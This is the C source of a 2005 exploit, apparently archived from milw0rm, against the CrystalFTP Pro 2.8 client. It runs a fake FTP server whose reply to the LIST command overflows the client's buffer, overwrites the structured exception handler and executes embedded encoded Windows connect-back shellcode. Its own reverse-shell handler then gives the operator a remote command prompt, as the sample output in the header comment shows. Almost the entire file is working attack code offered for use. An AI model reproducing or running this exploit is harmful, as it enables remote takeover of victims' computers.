/*
 * CrystalFTP Pro v2.8 Buffer Overflow Exploit
 *
 * 04/25/2005
 *
 * despite the fact that nobody uses CrystalFTP
 * i had to release a new version that replaces
 * the first one.
 *
 * this overwrites the structured exception handler
 * with a "pop edx pop eax ret" in kernel32.dll.
 * this takes us to a pointer of the next SEH.
 * just jmp over the SEH itself and reverse code
 * gets executed.
 *
 * add more targets if needed
 *
 * have phun
 *
 *               __              __                   _
 *   _______  __/ /_  ___  _____/ /__________  ____  (_)____
 *  / ___/ / / / __ \/ _ \/ ___/ __/ ___/ __ \/ __ \/ / ___/
 * / /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__
 * \___/\__, /_.___/\___/_/   \__/_/   \____/_/ /_/_/\___/
 *     /____/
 *
 * --[ exploit by : cybertronic - cybertronic[at]gmx[dot]net
 * --[ local IP: 192.168.2.102
 * --[ incomming connection from:   192.168.2.103
 * --[ sending welcome message...done!
 * --[ getting login information
 * --[ reading USER...done!
 * --[ reading PASS...done!
 *         USER LOGGED IN!
 * --[ proceeding...
 * --[ reading cmd...done!
 * --[ reading cmd...done!
 * --[ reading cmd...done!
 * --[ entering passive mode...
 * --[ passive connection established!
 * --[ reading cmd...done!
 * --[ user is trying to use "LIST" command
 * --[ w00d w00d, let`s kick his ass...
 * --[ sending packet [ 711 bytes ]...done!
 * --[ confirming...done!
 * --[ starting reverse handler [port: 1337]...done!
 * --[ incomming connection from:   192.168.2.103
 * --[ b0x pwned - h4ve phun
 * Microsoft Windows XP [Version 5.1.2600]
 * (C) Copyright 1985-2001 Microsoft Corp.
 *
 * C:\crystalFTP>
 *
 */

#include <stdio.h>
#include <strings.h>
#include <signal.h>
#include <netinet/in.h>
#include <netdb.h>

/*
 *
 * definitions
 *
 */

#define RED		"\E[31m\E[1m"
#define GREEN	"\E[32m\E[1m"
#define YELLOW	"\E[33m\E[1m"
#define BLUE	"\E[34m\E[1m"
#define NORMAL	"\E[m"

#define PORT	21
#define PASV	31337
#define BACKLOG	5

/*
 *
 * prototypes
 *
 */

int isip ( char* ip );
int shell ( int s, char* tip, unsigned short cbport );

char* get_cmd ( int s );

void auth ( int s );
void handle_cmd ( int s, int connfd, char* ip );
void header ();
void start_reverse_handler ();

/*********************
 * Windows Shellcode *
 *********************/

/*
 * Type  : connect back shellcode
 * Length: 316 bytes
 * CBIP  : reverseshell[111] ( ^ 0x99999999 )
 * CBPort: reverseshell[118] ( ^ 0x9999 )
 *
 */

unsigned char reverseshell[] =
"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x99\xE2\xFA"
"\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x62\x99\x99\x99\xC6\xFD\x38\xA9"
"\x99\x99\x99\x12\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3"
"\x9D\xC0\x71\x02\x99\x99\x99\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE"
"\xEA\xAB\xC6\xCD\x66\x8F\x12\x71\xF3\x9D\xC0\x71\x1B\x99\x99\x99"
"\x7B\x60\x18\x75\x09\x98\x99\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF"
"\x89\xC9\xC9\xC9\xC9\xD9\xC9\xD9\xC9\x66\xCF\x8D\x12\x41\xF1\xE6"
"\x99\x99\x98\xF1\x9B\x99\x9D\x4B\x12\x55\xF3\x89\xC8\xCA\x66\xCF"
"\x81\x1C\x59\xEC\xD3\xF1\xFA\xF4\xFD\x99\x10\xFF\xA9\x1A\x75\xCD"
"\x14\xA5\xBD\xF3\x8C\xC0\x32\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD"
"\xBD\xA4\x10\xC5\xBD\xD1\x10\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14\xDD"
"\xBD\x89\xCD\xC9\xC8\xC8\xC8\xF3\x98\xC8\xC8\x66\xEF\xA9\xC8\x66"
"\xCF\x9D\x12\x55\xF3\x66\x66\xA8\x66\xCF\x91\xCA\x66\xCF\x85\x66"
"\xCF\x95\xC8\xCF\x12\xDC\xA5\x12\xCD\xB1\xE1\x9A\x4C\xCB\x12\xEB"
"\xB9\x9A\x6C\xAA\x50\xD0\xD8\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3"
"\x4F\xED\x91\x58\x52\x94\x9A\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC3"
"\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D"
"\x12\x9A\x5C\x32\xC7\xC0\x5A\x71\x99\x66\x66\x66\x17\xD7\x97\x75"
"\xEB\x67\x2A\x8F\x34\x40\x9C\x57\x76\x57\x79\xF9\x52\x74\x65\xA2"
"\x40\x90\x6C\x34\x75\x60\x33\xF9\x7E\xE0\x5F\xE0";

unsigned char head[] =
"\x2d\x72\x77\x2d\x72\x2d\x2d\x72\x2d\x2d\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x32\x39\x20\x44\x65\x63\x20\x32"
"\x32\x20\x31\x33\x3a\x33\x37\x20\x63\x79\x62\x65\x72\x74\x72\x6f"
"\x6e\x69\x63\x2e";

char* argv3 = NULL;

/*
 *
 * functions
 *
 */

int
isip ( char* ip )
{
	unsigned int a, b, c, d;

	sscanf ( ip, "%d.%d.%d.%d", &a, &b, &c, &d );
	if ( a < 1 || a > 255 )
		return ( 1 );
	if ( b < 0 || b > 255 )
		return ( 1 );
	if ( c < 0 || c > 255 )
		return ( 1 );
	if ( d < 0 || d > 255 )
		return ( 1 );
	return ( 0 );
}

int
shell ( int s, char* tip, unsigned short cbport )
{
	int n;
	char buffer[2048];
	fd_set fd_read;

	printf ( "--[" YELLOW " b" NORMAL "0" YELLOW "x " NORMAL "p" YELLOW "w" NORMAL "n" YELLOW "e" NORMAL "d " YELLOW "- " NORMAL "h" YELLOW "4" NORMAL "v" YELLOW "e " NORMAL "p" YELLOW "h" NORMAL "u" YELLOW "n" NORMAL "\n" );

	FD_ZERO ( &fd_read );
	FD_SET ( s, &fd_read );
	FD_SET ( 0, &fd_read );

	while ( 1 )
	{
		FD_SET ( s, &fd_read );
		FD_SET ( 0, &fd_read );

		if ( select ( s + 1, &fd_read, NULL, NULL, NULL ) < 0 )
			break;
		if ( FD_ISSET ( s, &fd_read ) )
		{
			if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( write ( 1, buffer, n ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		if ( FD_ISSET ( 0, &fd_read ) )
		{
			if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( send ( s, buffer, n, 0 ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		usleep(10);
	}
}

char*
get_cmd ( int s )
{
	static char cmd[32];
	printf ( "--[" YELLOW " reading cmd..." NORMAL );
	if ( read ( s, cmd, 32 ) <= 0 )
	{
		printf ( RED "failed!\n" NORMAL);
		exit ( 1 );
	}
	printf ( GREEN "done!\n" NORMAL );
	return ( cmd );
}

void
auth ( int s )
{
	char user[32], pass[32], out[128];

	printf ( "--[ sending welcome message..." );
	bzero ( &out, 128 );
	strcpy ( out, "220 cybertronicFTP v0.2\r\n" );
	if ( write ( s, out, strlen ( out ) ) <= 0 )
	{
		printf ( RED "\twrite failed!\n" NORMAL );
		exit ( 1 );
	}
	printf ( GREEN "done!\n" NORMAL );
	printf ( "--[ getting login information\n" );
	printf ( "--[" YELLOW " reading USER..." NORMAL );
	sleep ( 1 );
	if ( read ( s, user, 32 ) <= 0 )
	{
		printf ( RED "failed!\n" NORMAL );
		exit ( 1 );
	}
	printf ( GREEN "done!\n" NORMAL );
	sleep ( 1 );
	bzero ( &out, 128 );
	strcpy ( out, "331 Anonymous FTP server\r\n" );
	if ( write ( s, out, strlen ( out ) ) <= 0 )
	{
		printf ( RED "\twrite failed!\n" NORMAL );
		exit ( 1 );
	}
	printf ( "--[" YELLOW " reading PASS..." NORMAL );
	sleep ( 1 );
	if ( read ( s, pass, 32 ) <= 0 )
	{
		printf ( RED "failed\n" NORMAL );
		exit ( 1 );
	}
	printf ( GREEN "done!\n" NORMAL );
	sleep ( 1 );
	bzero ( &out, 128 );
	strcpy ( out, "230 Login successful!\r\n" );
	if ( write ( s, out, strlen ( out ) ) <= 0 )
	{
		printf ( RED "\twrite failed!\n" NORMAL );
		exit ( 1 );
	}
	printf ( GREEN "\tUSER LOGGED IN!\n" NORMAL );
	printf ( "--[ proceeding...\n" );
}

void
handle_cmd ( int s, int s2, char* ip )
{
	int listenfd, connfd;
	int i = 1;
	int tmp[4];
	unsigned long ret = 0x77ea5794;		//edx eax ret	in kernel32.dll
	char* a = NULL;
	char* cmd;
	char out[128], buffer[1024], addr[32];
	pid_t childpid;
	socklen_t clilen;
	struct sockaddr_in cliaddr, servaddr;

	while ( 1 )
	{
		cmd = get_cmd ( s );
		if ( strncmp ( cmd, "PWD", 3 ) == 0 )
		{
			bzero ( &out, 128 );
			strcpy ( out, "257 \"/\" is current directory.\r\n" );
			if ( write ( s, out, strlen ( out ) ) <= 0 )
			{
				printf ( RED "\twrite failed!\n" NORMAL );
				exit ( 1 );
			}
		}
		else if ( strncmp ( cmd, "CWD", 3 ) == 0 )
		{
			bzero ( &out, 128 );
			strcpy ( out, "257 \"/\" is current directory.\r\n" );
			if ( write ( s, out, strlen ( out ) ) <= 0 )
			{
				printf ( RED "\twrite failed!\n" NORMAL );
				exit ( 1 );
			}
		}
		else if ( strncmp ( cmd, "TYPE", 4 ) == 0 )
		{
			bzero ( &out, 128 );
			strcpy ( out, "200 Type set to A..\r\n" );
			if ( write ( s, out, strlen ( out ) ) <= 0 )
			{
				printf ( RED "\twrite failed!\n" NORMAL );
				exit ( 1 );
			}
		}
		else if ( strncmp ( cmd, "PASV", 4 ) == 0 )
		{
			bzero ( &addr, 32 );
			a = ( char* ) strtok ( ip, "." );
			tmp[0] = ( int ) a;
			while ( a != NULL )
			{
				a = ( char* ) strtok ( NULL, "." );
				tmp[i] = ( int )a;
				i++;
			}
			bzero ( &out, 128 );
			sprintf( out, "227 Entering Passive Mode. (%s,%s,%s,%s,122,105).\r\n", tmp[0], tmp[1], tmp[2], tmp[3] );
			if ( write ( s, out, strlen ( out ) ) <= 0 )
			{
				printf ( RED "\twrite failed!\n" NORMAL );
				exit ( 1 );
			}
			printf ( "--[ entering passive mode...\n" );
			if ( ( listenfd = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
			{
        			printf ( RED "socket failed!\n" NORMAL );
        			exit ( 1 );
			}
			bzero ( &servaddr, sizeof ( servaddr ) );
			servaddr.sin_family = AF_INET;
			servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
			servaddr.sin_port = htons ( PASV );
			bind ( listenfd, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
			if ( listen ( listenfd, 1 ) == -1 )
			{
				printf ( RED "listen failed!\n" NORMAL );
				exit ( 1 );
			}
			clilen = sizeof ( cliaddr );
			if ( ( connfd = accept ( listenfd, ( struct sockaddr * ) &cliaddr, &clilen ) ) < 0 )
			{
				close ( listenfd );
				printf ( RED "accept failed!\n" NORMAL );
				exit ( 1 );
			}
			close ( listenfd );
			printf ( "--[" GREEN " passive connection established!\n" NORMAL );
			handle_cmd ( s, connfd, addr );
		}
		else if ( strncmp ( cmd, "LIST", 4 ) == 0 )
		{
			printf ( "--[" GREEN " user is trying to use \"LIST\" command\n" NORMAL );
			printf ( "--[ w00d w00d, let`s kick his ass...\n" );
			bzero ( &buffer, 1024 );
			memcpy ( buffer, head, sizeof ( head ) - 1 );
			memset ( buffer + 68, 0x90, 255 );
			memcpy ( buffer + 321, "\xeb\x46", 2 );
			strncat ( buffer, ( unsigned char * ) &ret, 4 );
			memset ( buffer + 327, 0x90, 66 );
			memcpy ( buffer + 393, reverseshell, sizeof ( reverseshell ) - 1 );
			strcat ( buffer, "\r\n" );
			bzero ( &out, 128 );
			strcpy ( out, "150 Here comes the directory listing.\r\n" );
			if ( write ( s, out, strlen ( out ) ) <= 0 )
			{
				printf ( RED "\twrite failed!\n" NORMAL );
				exit ( 1 );
			}
			printf ( "--[ sending packet [ %d bytes ]...", strlen ( buffer ) );
			if ( write ( s2, buffer, strlen ( buffer ) ) <= 0 )
			{
				printf ( RED "\twrite failed!\n" NORMAL );
				exit ( 1 );
			}
			printf ( GREEN "done!\n" NORMAL);
			bzero ( &out, 128 );
			strcpy ( out, "226 Transfer ok\r\n" );
			printf ( "--[ confirming..." );
			if ( write ( s, out, strlen ( out ) ) <= 0 )
			{
				printf ( RED "\twrite failed!\n" NORMAL );
				exit ( 1 );
			}
			printf ( GREEN "done!\n" NORMAL);
			close ( s2 );
			start_reverse_handler ( argv3 );
		}
		else
		{
			bzero ( &out, 128 );
			strcpy ( out, "550 command not supported\r\n" );
			if ( write ( s, out, strlen ( out ) ) <= 0 )
			{
				printf ( RED "\twrite failed!\n" NORMAL );
				exit ( 1 );
			}
		}
	}
}

void
header ()
{
	printf ( "              __              __                   _           \n" );
	printf ( "  _______  __/ /_  ___  _____/ /__________  ____  (_)____      \n" );
	printf ( " / ___/ / / / __ \\/ _ \\/ ___/ __/ ___/ __ \\/ __ \\/ / ___/  \n" );
	printf ( "/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__        \n" );
	printf ( "\\___/\\__, /_.___/\\___/_/   \\__/_/   \\____/_/ /_/_/\\___/  \n" );
	printf ( "    /____/                                                     \n\n" );
	printf ( "--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net\n" );
}

void
start_reverse_handler ()
{
	int s1, s2;
	unsigned short cbport;
	struct sockaddr_in cliaddr, servaddr;
	socklen_t clilen = sizeof ( cliaddr );

	sscanf ( argv3, "%u", &cbport );
	
	bzero ( &servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( cbport );

	printf ( "--[ starting reverse handler [port: %u]...", cbport );
	if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
	{
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	bind ( s1, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
	if ( listen ( s1, 1 ) == -1 )
	{
		printf ( "listen failed!\n" );
		exit ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	if ( ( s2 = accept ( s1, ( struct sockaddr * ) &cliaddr, &clilen ) ) < 0 )
	{
		printf ( "accept failed!\n" );
		exit ( 1 );
	}
	close ( s1 );
	printf ( "--[" GREEN " incomming connection from:\t" YELLOW " %s\n" NORMAL, inet_ntoa ( cliaddr.sin_addr ) );
	shell ( s2, ( char* ) inet_ntoa ( cliaddr.sin_addr ), cbport );
	close ( s2 );
}

int
main ( int argc, char* argv[] )
{
	int listenfd, connfd;
	unsigned long xoredip;
	unsigned short xoredcbport;
	char* ip;
	pid_t childpid;
	socklen_t clilen;
	struct sockaddr_in cliaddr, servaddr;

	if ( argc != 3 )
	{
		printf ( RED "--[ usage: %s <connectback ip> <connectback port>\n" NORMAL, argv[0] );
		exit ( 1 );
	}
	if ( isip ( argv[1] ) != 0 )
	{
		printf ( RED "--[ enter a valid IP\n" NORMAL );
		exit ( 1 );
	}
	system ( "clear" );
	header ();
	argv3 = argv[2];
	xoredip = inet_addr ( argv[1] ) ^ ( unsigned long ) 0x99999999;
	xoredcbport = htons ( atoi ( argv[2] ) ) ^ ( unsigned short ) 0x9999;
	memcpy ( &reverseshell[111], &xoredip, 4);
	memcpy ( &reverseshell[118], &xoredcbport, 2);
	if ( ( listenfd = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
	{
        	printf ( RED "socket failed!\n" NORMAL );
        	exit ( 1 );
	}
	bzero ( &servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( PORT );
	bind ( listenfd, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
	if ( listen ( listenfd, BACKLOG ) == -1 )
	{
		printf ( RED "listen failed!\n" NORMAL );
		exit ( 1 );
	}
	for ( ; ; )
	{
		clilen = sizeof ( cliaddr );
		if ( ( connfd = accept ( listenfd, ( struct sockaddr * ) &cliaddr, &clilen ) ) < 0 )
		{
			close ( listenfd );
			printf ( RED "accept failed!\n" NORMAL );
			exit ( 1 );
		}
		if ( ( childpid = fork ( ) ) == 0 )
		{
			close ( listenfd );
			ip = ( char* ) ( argv[1] );
			printf ( "--[ local IP: %s\n", ip );
			printf ( "--[" GREEN " incomming connection from:\t" YELLOW " %s\n" NORMAL, inet_ntoa ( cliaddr.sin_addr ) );
			auth ( connfd );
			handle_cmd ( connfd, ( int ) NULL, ip );
		}
		close ( connfd );
	}
}

// milw0rm.com [2005-04-24]
